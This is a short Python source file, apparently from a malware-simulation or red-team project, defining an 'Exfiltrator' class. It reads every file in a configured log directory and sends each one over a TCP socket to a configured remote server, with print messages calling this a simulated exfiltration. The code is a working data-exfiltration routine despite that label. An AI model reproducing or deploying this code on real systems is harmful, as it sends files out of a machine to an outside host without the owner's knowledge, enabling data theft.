import socket
import os
from utils.config import SERVER_HOST, SERVER_PORT, LOG_DIR

class Exfiltrator:
    def __init__(self):
        self.server = (SERVER_HOST, SERVER_PORT)

    def exfiltrate_logs(self):
        for filename in os.listdir(LOG_DIR):
            filepath = os.path.join(LOG_DIR, filename)
            if os.path.isfile(filepath):
                with open(filepath, "rb") as f:
                    data = f.read()
                try:
                    print(f"[*] Simulating exfiltration of {filename}")
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.connect(self.server)
                        s.sendall(f"FILENAME:{filename}\n".encode())
                        s.sendall(data)
                    print(f"[+] {filename} exfiltrated.")
                except Exception as e:
                    print(f"[!] Failed to exfiltrate {filename}: {e}")
